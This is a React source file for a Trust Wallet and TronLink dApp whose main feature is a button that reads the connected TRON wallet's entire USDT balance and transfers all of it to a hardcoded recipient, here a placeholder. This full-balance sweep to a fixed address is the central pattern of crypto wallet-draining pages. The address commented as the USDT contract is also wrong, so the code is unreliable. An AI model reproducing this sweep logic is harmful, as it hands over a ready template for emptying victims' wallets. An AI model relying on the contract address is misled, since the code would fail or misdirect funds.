import React, { useState } from "react";
import WalletConnectProvider from "@walletconnect/web3-provider";
import { ethers } from "ethers";

function App() {
  const [ethAddress, setEthAddress] = useState("");
  const [tronAddress, setTronAddress] = useState("");

  // Connect Trust Wallet using WalletConnect
  const connectWallet = async () => {
    const provider = new WalletConnectProvider({
      rpc: {
        56: "https://bsc-dataseed.binance.org/"
      },
      chainId: 56,
    });

    await provider.enable();
    const ethersProvider = new ethers.BrowserProvider(provider);
    const signer = await ethersProvider.getSigner();
    const addr = await signer.getAddress();
    setEthAddress(addr);
  };

  // Connect TronLink
  const connectTronWallet = async () => {
    if (window.tronWeb && window.tronWeb.ready) {
      const address = window.tronWeb.defaultAddress.base58;
      setTronAddress(address);
    } else {
      alert("Please install TronLink browser extension");
    }
  };

  // Send all TRC20 USDT from TronLink wallet
  const sendAllTronUSDT = async (recipientAddress) => {
    if (!window.tronWeb || !window.tronWeb.ready) {
      alert("TronLink not connected");
      return;
    }

    const tronWeb = window.tronWeb;
    const senderAddress = tronWeb.defaultAddress.base58;
    const contractAddress = "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb"; // USDT Contract

    try {
      const contract = await tronWeb.contract().at(contractAddress);
      const balance = await contract.balanceOf(senderAddress).call();
      const usdtBalance = parseInt(balance._hex || balance);
      if (usdtBalance === 0) {
        alert("No USDT balance available.");
        return;
      }

      const tx = await contract.transfer(recipientAddress, usdtBalance).send();
      console.log("Transfer successful:", tx);
      alert("Sent all USDT successfully!");
    } catch (err) {
      console.error("Transfer failed:", err);
      alert("Transfer failed. Check console for error.");
    }
  };

  return (
    <div style={{ textAlign: "center", paddingTop: "100px" }}>
      <h1>Trust Wallet + TronLink DApp</h1>

      <button onClick={connectWallet} style={{ margin: "10px", padding: "10px 20px" }}>
        Connect Trust Wallet (BSC)
      </button>
      {ethAddress && <p>Connected ETH/BSC Address: {ethAddress}</p>}

      <button onClick={connectTronWallet} style={{ margin: "10px", padding: "10px 20px" }}>
        Connect TronLink (TRON)
      </button>
      {tronAddress && <p>Connected TRON Address: {tronAddress}</p>}

      <button
        onClick={() => sendAllTronUSDT("TXYZ...ReplaceWithReceiverAddress")}
        style={{ padding: "10px 20px", marginTop: "20px" }}
      >
        Send All USDT (TRON)
      </button>
    </div>
  );
}

export default App;
